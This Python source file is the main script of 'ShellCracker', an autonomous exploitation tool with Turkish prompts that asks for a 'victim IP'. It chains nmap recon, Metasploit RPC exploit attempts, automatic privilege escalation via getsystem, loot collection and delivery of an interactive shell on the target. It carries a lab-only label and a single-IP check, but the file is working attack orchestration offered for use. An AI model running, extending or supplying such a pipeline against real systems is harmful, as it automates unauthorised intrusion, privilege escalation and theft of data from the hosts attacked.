#!/usr/bin/env python3
"""ShellCracker -- autonomous lab-only exploitation pipeline.

Given a SINGLE target IP, ShellCracker runs recon -> match -> dry-run -> fire ->
verify, and on success drops the user straight into the obtained session.

AUTHORIZED LAB USE ONLY. ShellCracker keeps this at the tool level:

* exactly one IP address (no CIDR, ranges, lists or input files),
* no hardcoded targets and no internet-facing scan mode,
* Ctrl+C stops immediately and cleans up sessions it opened.
"""

from __future__ import annotations

import argparse
import ipaddress
import logging
import signal
import sys
from datetime import datetime
from pathlib import Path

import yaml

from core import colors as C
from core import executor as execmod
from core import matcher, profiler, recon, reporter
from core import strategy as strat

LOG = logging.getLogger("ShellCracker")

_ART = r"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⢤⣴⠾⠏⠙⠺⠭⠓⢋⡲⠳⠉⢿⠛⣓⠶⠤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣛⣬⣱⢊⡶⢃⠖⣂⢂⡓⠞⢒⠛⠴⠳⣧⣶⣈⣷⢯⠞⣥⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣶⣿⣯⡭⢽⡓⠤⣃⠔⣣⢚⡤⢣⠜⡈⢥⠊⠄⠤⢡⣻⡃⠸⣻⣯⣒⣭⡢⢑⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢠⣾⢿⣿⢛⡻⡱⢎⡜⢣⢌⡓⡌⣆⢣⢃⠆⠱⡈⡒⠈⠠⢹⣧⠁⠀⠠⠉⠙⠻⢽⣷⣌⠈⠠⢀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣴⡿⣳⣿⡩⢎⡵⣙⠮⡜⣆⠞⣔⡱⣈⣆⡛⣿⣱⣶⠹⣆⣜⢫⡏⠀⠀⠀⡠⠂⡔⠀⠌⡛⣷⡀⢤⡁⡀⠀⠀⠀⠀⠀
⠀⠀⣼⣿⣿⣿⢷⢻⡞⣴⣩⣚⡝⢮⣟⣾⣳⣿⡾⣽⣎⡷⢯⣛⡷⡾⣯⣾⠄⠀⢀⠂⣠⠎⠰⢡⠀⠙⣿⣄⣄⠌⡄⠀⠀⠀⠀
⠀⣰⣿⣷⣿⢏⣾⣥⡿⣶⣥⣿⣾⢟⣯⣻⣭⣿⣵⣭⣬⣛⡽⠽⣟⣿⣶⣿⣧⠀⠈⡌⣸⡀⡀⡀⠤⠤⢚⣽⣧⠄⢞⠆⠀⠀⠀
⢠⢻⠃⣷⣟⣿⣻⣞⣳⣿⣿⣻⣾⣿⣿⣿⣿⠶⠿⠷⢾⣿⣽⡲⢿⣻⣿⣿⣿⡞⡌⠰⢻⣚⠈⠁⠀⠠⠀⠻⣟⣎⠀⠈⡄⠀⠀
⢸⣿⢰⣿⣿⣳⣽⣾⣿⣿⣿⣿⣿⢟⡍⢥⢶⣹⣒⡤⢊⡥⠉⠻⣷⣍⠷⣽⣿⣿⣿⡔⡙⡿⡀⢀⠸⡐⠀⡀⢻⡿⣞⠰⢰⠀⠀
⢸⡿⣿⣿⣿⣵⣿⣿⣿⣿⣿⣿⣷⣷⣿⣟⣾⣯⣯⣂⣲⣧⡈⠶⣈⢿⣯⣊⣿⣿⣷⢷⡕⡅⣰⣽⠋⠀⠀⠈⠀⢽⣷⠂⠃⡇⠀
⢸⣷⣿⣯⣿⣽⣿⣿⣿⣿⣿⣩⣿⣿⣿⠟⠉⠙⠻⢝⣿⣏⢵⡄⠉⡌⢻⣟⣽⣿⣿⡾⢇⢃⣿⠏⠰⠂⠀⠀⠀⡸⣿⡆⡐⠱⠀
⢸⣹⣾⡱⣿⣿⣿⣿⣷⣿⣿⢹⣿⣿⢡⣾⡿⡙⡀⠠⢱⣣⠙⠉⠀⠸⡪⣿⣼⣿⣿⣿⢿⣭⡌⢢⠀⠁⠀⡀⠀⢰⢿⡇⠀⡘⠀
⠀⢿⡿⣷⣹⣿⣿⢿⣻⣽⣿⣯⣿⣿⣟⠿⣦⠆⡼⠂⣠⢻⣇⣆⢀⠀⢱⣻⡇⣿⣟⣿⣯⢙⡇⠀⡀⢀⡆⠀⠀⠈⣿⡇⠀⡄⡆
⠀⠈⣿⣿⣳⠽⣻⣿⣿⣿⣿⣿⣞⡻⢯⢿⡒⡍⠀⣰⣫⡟⣼⡿⠋⠀⣿⣹⠱⣿⣹⣿⣿⠚⠁⢈⠇⠁⠀⠀⠠⢠⣾⡗⠐⠂⣧
⠀⠀⠘⢿⣯⣎⡱⢟⣿⣿⣿⣿⣿⣿⣶⣗⣰⣶⣾⠟⣋⡜⡉⠀⠁⠀⣶⣿⢱⣿⣿⣿⢇⡄⠉⢀⡠⠁⢀⠡⠡⣨⣿⡇⢠⡐⢶
⠀⠀⠀⠀⠹⢿⣳⢮⡲⢍⠿⢿⣿⣻⣵⣿⣒⣷⣜⣿⡍⠂⠁⠀⢠⢞⣿⢢⣾⣽⣿⠷⡙⢠⣼⠷⠚⠁⠀⠀⠀⣷⡿⠇⠎⢴⠋
⠀⠀⠀⠀⠀⠈⠙⢷⣯⣘⣌⡃⠲⠙⠌⠛⡛⠿⠟⠛⠉⠠⣂⣴⣿⡟⣵⣿⣿⣿⢳⢁⣫⣯⠆⠠⠀⠀⠀⠀⠀⣿⣷⢹⠘⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠳⣽⣥⣬⣔⣲⣄⣅⣠⣾⣵⣿⣿⡿⣏⡑⢿⣿⣿⡃⡗⣤⢶⣆⣤⣤⣶⡒⢒⣒⣻⣽⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠚⠿⠿⢿⣿⣿⣿⣥⣸⣿⡟⠋⠞⠉⠉⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""


def _print_banner() -> None:
    """Print the ASCII banner (coloured when the terminal supports it)."""
    print(C.style(_ART, "bold", "red"))
    print(C.style("                 S H E L L C R A C K E R\n", "bold", "white"))


def _startup() -> None:
    """Clear the screen, run the loading spinner, greet, then clear again.

    Skipped when stdout is not a real terminal (piped/redirected output), so
    nothing leaks into logs or pipes.
    """
    import itertools
    import os
    import time

    if not sys.stdout.isatty():
        return

    clear = "cls" if os.name == "nt" else "clear"
    os.system(clear)
    spinner = itertools.cycle(["|", "/", "-", "\\"])
    sys.stdout.write(C.style("Sistem aciliyor ", "white"))
    sys.stdout.flush()

    end_time = time.time() + 2.5
    while time.time() < end_time:
        sys.stdout.write(next(spinner))
        sys.stdout.flush()
        time.sleep(0.12)
        sys.stdout.write("\b")

    sys.stdout.write(C.style(" Hosgeldiniz", "ok") + "\n")
    sys.stdout.flush()
    time.sleep(1)
    os.system(clear)


def _section(title: str) -> None:
    """Print a bold, coloured section header to structure the output."""
    print("\n" + C.style(f"═══[ {title} ]" + "═" * max(4, 44 - len(title)), "bold", "cyan"))


class _ConsoleFormatter(logging.Formatter):
    """Clean, coloured console lines: a severity symbol + the message only."""

    _MAP = {
        logging.DEBUG: ("[.]", "dim"),
        logging.INFO: ("[*]", "info"),
        logging.WARNING: ("[!]", "warn"),
        logging.ERROR: ("[-]", "err"),
        logging.CRITICAL: ("[-]", "err"),
    }

    def format(self, record: logging.LogRecord) -> str:
        sym, kind = self._MAP.get(record.levelno, ("[*]", "info"))
        return C.style(f"{sym} {record.getMessage()}", kind)


def setup_logging(target: str, reports_dir: Path, to_file: bool) -> Path | None:
    """Clean coloured console logging; a detailed logfile only when requested."""
    stream = logging.StreamHandler(sys.stdout)
    stream.setFormatter(_ConsoleFormatter())
    handlers: list[logging.Handler] = [stream]

    logfile: Path | None = None
    if to_file:
        reports_dir.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        logfile = reports_dir / f"ShellCracker_{target.replace(':', '_')}_{ts}.log"
        fh = logging.FileHandler(logfile, encoding="utf-8")
        fh.setFormatter(
            logging.Formatter("%(asctime)s [%(levelname)s] %(name)s: %(message)s")
        )
        handlers.append(fh)

    logging.basicConfig(level=logging.INFO, handlers=handlers)
    if logfile:
        LOG.info("Gunluk dosyasi: %s", logfile)
    return logfile


def validate_single_ip(value: str) -> str:
    """Accept exactly one IP address. Reject CIDR, ranges, lists, files.

    Raises:
        argparse.ArgumentTypeError: On anything that is not a single IP.
    """
    raw = value.strip()
    for bad, label in (("/", "CIDR"), (",", "liste"), (" ", "liste"), ("-", "aralik")):
        if bad in raw:
            raise argparse.ArgumentTypeError(
                f"Tek bir IP adresi girilmeli; {label} girisi ('{raw}') kabul "
                "edilmez. ShellCracker tek hedefli, yalnizca lab icindir."
            )
    try:
        ip = ipaddress.ip_address(raw)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(
            f"'{raw}' gecerli bir IP adresi degil: {exc}"
        ) from exc
    return str(ip)


def prompt_for_target() -> str | None:
    """Interactively ask the user for the single target IP.

    Loops until a valid single IP is entered. Returns ``None`` if the user
    cancels (empty input + Ctrl+C / EOF).
    """
    _print_banner()
    try:
        while True:
            raw = input(C.style("[?] Kurban IP (tek adres): ", "bold", "info")).strip()
            if not raw:
                print(C.dim("    (Bos. Cikmak icin Ctrl+C.)"))
                continue
            try:
                return validate_single_ip(raw)
            except argparse.ArgumentTypeError as exc:
                print(C.err(f"    [!] {exc}\n"))
    except (EOFError, KeyboardInterrupt):
        print()
        return None


def load_config(path: str | Path) -> dict:
    """Load YAML config, or exit with a hint if it is missing."""
    p = Path(path)
    if not p.exists():
        print(
            C.err(f"[!] Yapilandirma dosyasi '{p}' bulunamadi. Once sablonu kopyala:")
            + f"\n      cp config.yaml.example {p}\n",
            file=sys.stderr,
        )
        sys.exit(2)
    with p.open("r", encoding="utf-8") as fh:
        return yaml.safe_load(fh) or {}


def detect_lhost(target: str) -> str:
    """Detect the local IP the kernel would use to reach ``target``.

    Opens a UDP socket toward the target (no packets are actually sent) and
    reads back the chosen source address. Falls back to 127.0.0.1 on failure.
    """
    import socket

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 9))
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


def _stop_proc(proc) -> None:
    """Terminate a process we started, forcing a kill if it does not stop."""
    try:
        proc.terminate()
        proc.wait(timeout=5)
    except Exception:  # noqa: BLE001 - best-effort teardown
        try:
            proc.kill()
        except Exception:  # noqa: BLE001
            pass


def _launch_window_attach(msf_cfg: dict, sid: int) -> str | None:
    """Open a new terminal window that attaches to session ``sid``.

    Tries the common terminal emulators in order. Returns the name of the
    emulator that launched, or ``None`` if none is available (the caller then
    falls back to an in-process attach in the current window).
    """
    import shlex
    import shutil
    import subprocess

    script = Path(__file__).resolve().parent / "attach.py"
    cmd = [
        "python3", str(script),
        "--sid", str(sid),
        "--host", str(msf_cfg.get("host", "127.0.0.1")),
        "--port", str(msf_cfg.get("port", 55553)),
        "--user", str(msf_cfg.get("user", "msf")),
        "--password", str(msf_cfg.get("password", "msf")),
    ]
    if not bool(msf_cfg.get("ssl", True)):
        cmd.append("--no-ssl")
    cmd_str = shlex.join(cmd)

    # Each emulator has its own argument convention for "run this command".
    candidates = [
        ["gnome-terminal", "--", *cmd],
        ["qterminal", "-e", cmd_str],
        ["xfce4-terminal", "-e", cmd_str],
        ["konsole", "-e", *cmd],
        ["xterm", "-e", *cmd],
        ["x-terminal-emulator", "-e", *cmd],
    ]
    for argv in candidates:
        if shutil.which(argv[0]) is None:
            continue
        try:
            subprocess.Popen(argv)
            return argv[0]
        except Exception:  # noqa: BLE001 - try the next emulator
            continue
    return None


def _write_report(
    target, recon_result, matches, attempts, reports_dir, profile=None, plan=None
) -> tuple[str, str]:
    """Build and write JSON + Markdown reports; return the two paths."""
    if recon_result is None:
        return "", ""
    report = reporter.build_report(
        target, True, recon_result, matches, attempts, profile=profile, plan=plan
    )
    return reporter.write_reports(report, reports_dir)


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="ShellCracker",
        description="Autonomous lab-only exploitation pipeline (single target).",
        epilog="AUTHORIZED LAB USE ONLY. You are responsible for having permission.",
    )
    parser.add_argument(
        "--target",
        default=None,
        help="A single target IP address (no CIDR/range/list/file). "
        "If omitted, ShellCracker asks for it interactively.",
    )
    parser.add_argument(
        "--config",
        default="config.yaml",
        help="Path to the YAML config file (default: config.yaml).",
    )
    parser.add_argument(
        "--rapor",
        action="store_true",
        help="Write JSON report + logfile (and raw nmap XML) to reports/. "
        "Off by default.",
    )
    parser.add_argument(
        "--ayni-pencere",
        dest="ayni_pencere",
        action="store_true",
        help="On success, attach to the session in THIS window instead of "
        "opening a new terminal window (the default).",
    )
    args = parser.parse_args(argv)

    _startup()  # clear + loading animation + welcome (skipped if not a TTY)

    # Resolve the target: from --target if given (validated here), otherwise ask.
    if args.target:
        _print_banner()
        try:
            args.target = validate_single_ip(args.target)
        except argparse.ArgumentTypeError as exc:
            parser.error(str(exc))
    else:
        resolved = prompt_for_target()
        if resolved is None:
            print(C.err("[!] Hedef girilmedi. Cikiliyor."))
            return 1
        args.target = resolved

    config = load_config(args.config)
    reports_dir = Path("reports")
    setup_logging(args.target, reports_dir, to_file=args.rapor)

    print(C.style("    Hedef: ", "bold") + C.style(args.target, "bold", "ok"))

    # Auto-detect LHOST so the user never has to edit config for a basic run.
    handler = config.setdefault("handler", {})
    lhost = str(handler.get("lhost") or "").strip()
    if lhost.lower() in ("", "auto"):
        detected = detect_lhost(args.target)
        handler["lhost"] = detected
        print(C.style("    LHOST: ", "bold") + C.style(detected, "bold", "ok") + C.dim("  (otomatik)"))

    the_executor: execmod.Executor | None = None
    msf_proc = None  # msfrpcd process if ShellCracker started it

    def handle_sigint(signum, frame):  # noqa: ANN001 - signal handler signature
        LOG.warning("Ctrl+C alindi -- durduruluyor ve temizleniyor.")
        if the_executor is not None:
            the_executor.cleanup()
        if msf_proc is not None:
            _stop_proc(msf_proc)
        sys.exit(130)

    signal.signal(signal.SIGINT, handle_sigint)

    recon_result = None
    matches: list = []
    attempts: list = []
    profile = None
    plan = None

    try:
        # --- 1. RECON -------------------------------------------------------
        _section("KESIF")
        recon_cfg = config.get("recon", {})
        nmap_args = recon_cfg.get("nmap_arguments", "-sV -Pn")
        if recon_cfg.get("os_detection") and "-O" not in nmap_args:
            nmap_args += " -O"  # enables the profiler's OS-family guess (needs root)
        if recon_cfg.get("default_scripts") and "-sC" not in nmap_args:
            nmap_args += " -sC"
        recon_result = recon.run_recon(
            target=args.target,
            nmap_arguments=nmap_args,
            timeout=int(recon_cfg.get("timeout", 300)),
            reports_dir=reports_dir,
            save_xml=args.rapor,
        )
        open_services = recon_result.open_services()
        if not open_services:
            LOG.warning("Acik servis bulunamadi.")
            if args.rapor:
                _write_report(args.target, recon_result, matches, attempts, reports_dir)
            return 0

        # --- 2. PROFILE -----------------------------------------------------
        _section("PROFIL")
        profile = profiler.build_profile(recon_result, recon_result.os_matches)
        print(
            C.style("    OS tahmini: ", "bold")
            + C.style(f"{profile.os_family}", "bold", "ok")
            + C.dim(f"  (%{int(profile.os_confidence * 100)}, {profile.os_details})")
        )
        for cat in profile.categories():
            ports = ", ".join(str(s.port) for s in profile.categorized[cat])
            print(C.info(f"    - {cat:<10}") + C.dim(f" -> port {ports}"))

        # --- 3. CONNECT (auto-start msfrpcd if needed) ---------------------
        msf_cfg = config.get("msfrpc", {})
        LOG.info("Metasploit RPC'ye baglaniliyor (calismiyorsa otomatik baslatilir)...")
        client, msf_proc = execmod.connect_or_start(
            host=msf_cfg.get("host", "127.0.0.1"),
            port=int(msf_cfg.get("port", 55553)),
            user=msf_cfg.get("user", "msf"),
            password=msf_cfg.get("password", "msf"),
            ssl=bool(msf_cfg.get("ssl", True)),
        )
        if msf_proc is not None:
            LOG.info("msfrpcd otomatik baslatildi (PID %s).", msf_proc.pid)

        # Exploit-DB matches for the report (informational, non-fireable).
        matches = matcher.match_services(
            open_services,
            msf_client=None,  # strategy already drives MSF search; avoid double work
            use_searchsploit=config.get("searchsploit", {}).get("enabled", True),
        )

        # --- 4. STRATEGY (the autonomous brain builds a scored plan) -------
        _section("STRATEJI")
        engine = strat.StrategyEngine(profile, client, config)
        plan = engine.build()
        if len(plan) == 0:
            LOG.warning("Denenebilir saldiri vektoru uretilemedi.")
            if args.rapor:
                _write_report(args.target, recon_result, matches, attempts,
                              reports_dir, profile=profile, plan=plan)
            if msf_proc is not None:
                _stop_proc(msf_proc)
            return 0

        print(
            C.style("[*] ", "info")
            + C.style(str(len(plan)), "bold", "info")
            + C.info(" saldiri vektoru planlandi (faz sirasi: kesif -> vulnscan -> exploit -> kimlik -> misconfig).")
        )
        for ph in strat.PHASES:
            pend = plan.pending(ph)
            if not pend:
                continue
            print(C.style(f"    [{ph}] ", "bold", "cyan") + C.dim(f"{len(pend)} vektor"))
            for v in pend[:4]:
                print(C.dim(f"      {v.score:5.0f}  {v.module_type}/{v.module}")
                      + C.dim(f"  — {v.rationale}"))

        # --- 5. EXECUTE (adaptive phase loop with feedback) ----------------
        _section("SOMURU")
        the_executor = execmod.Executor(client, args.target, config)
        attempts = the_executor.run_plan(plan, engine)

        # --- 6. SHELL DELIVERY ---------------------------------------------
        success = next((a for a in attempts if getattr(a, "success", False)), None)
        if success is not None:
            sid = success.session_id
            print()
            print(C.style("  ╔══════════════════════════════════════╗", "bold", "ok"))
            print(
                C.style("  ║  ", "bold", "ok")
                + C.style(f"SHELL ALINDI  —  oturum {sid} ({success.session_type or '?'})", "bold", "ok")
            )
            print(C.style("  ╚══════════════════════════════════════╝", "bold", "ok"))

            # Post-exploitation triage summary (gathered automatically).
            pe = getattr(success, "postexp", None) or {}
            if pe:
                who = (pe.get("whoami") or "?").splitlines()[0] if pe.get("whoami") else "?"
                priv = "ROOT/SYSTEM" if pe.get("is_privileged") else "sinirli yetki"
                tag = "ok" if pe.get("is_privileged") else "warn"
                print(C.style("    Kullanici: ", "bold") + C.style(who, "bold", tag)
                      + C.dim(f"  ({priv})"))
                if pe.get("escalated"):
                    print(C.style("    Yetki: ", "bold") + C.ok("getsystem ile yukseltildi"))
                for sug in (pe.get("privesc_suggestions") or [])[:5]:
                    print(C.info("    privesc -> ") + C.dim(sug))
                loot = [k for k, v in (pe.get("loot") or {}).items()
                        if v and not str(v).startswith("[hata")]
                if loot:
                    print(C.style("    Toplanan: ", "bold") + C.dim(", ".join(loot)))

            # Default: open the interactive shell in a NEW terminal window so
            # the user can type commands inside the session there. Fall back to
            # this window if no terminal emulator is available or --ayni-pencere.
            if args.ayni_pencere:
                the_executor.interact(sid)
            else:
                term = _launch_window_attach(msf_cfg, sid)
                if term:
                    LOG.info("Oturum yeni pencerede acildi (%s). Komutlarini orada yaz.", term)
                else:
                    LOG.warning("Terminal penceresi acilamadi; bu pencerede baglaniliyor.")
                    the_executor.interact(sid)
        else:
            print(C.style("\n  [-] Shell alinamadi. Tum adaylar denendi.", "bold", "warn"))

    except execmod.MsfConnectionError as exc:
        LOG.error("%s", exc)
        if args.rapor:
            _write_report(args.target, recon_result, matches, attempts, reports_dir,
                          profile=profile, plan=plan)
        return 3
    except Exception as exc:  # noqa: BLE001 - top-level guard
        LOG.exception("Beklenmeyen hata: %s", exc)
        if args.rapor:
            _write_report(args.target, recon_result, matches, attempts, reports_dir,
                          profile=profile, plan=plan)
        if msf_proc is not None:
            _stop_proc(msf_proc)
        return 1

    succeeded = any(getattr(a, "success", False) for a in attempts)

    # Optional report (off by default).
    if args.rapor:
        json_path, md_path = _write_report(
            args.target, recon_result, matches, attempts, reports_dir,
            profile=profile, plan=plan
        )
        print(C.info(f"[*] JSON rapor: {json_path}"))
        print(C.info(f"[*] MD rapor:   {md_path}"))

    # If ShellCracker started msfrpcd: keep it alive when a session landed so the
    # shell survives (per design); otherwise shut it back down.
    if msf_proc is not None:
        if succeeded:
            print(C.info(f"[*] msfrpcd acik birakildi (PID {msf_proc.pid}) — oturum canli."))
            print(C.dim(f"    Durdurmak icin: kill {msf_proc.pid}"))
        else:
            _stop_proc(msf_proc)
            LOG.info("Otomatik baslatilan msfrpcd kapatildi.")

    return 0 if succeeded else 4


if __name__ == "__main__":
    raise SystemExit(main())
